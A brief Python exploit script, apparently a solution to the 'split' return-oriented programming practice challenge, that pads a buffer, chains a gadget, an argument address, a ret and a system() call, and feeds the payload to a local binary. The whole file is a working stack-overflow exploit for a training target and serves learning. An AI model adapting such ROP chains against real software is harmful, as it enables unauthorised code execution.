import subprocess
from pwn import p64

bin = "./split"

gadget = p64(0x4007C3)
sys = p64(0x400560)
arg = p64(0x601060)
ret = p64(0x400741)
padding = b"A" * 40


payload = padding + gadget + arg + ret + sys

result = subprocess.run([bin], input=payload, text=False, capture_output=True)

print(result.stdout.decode())
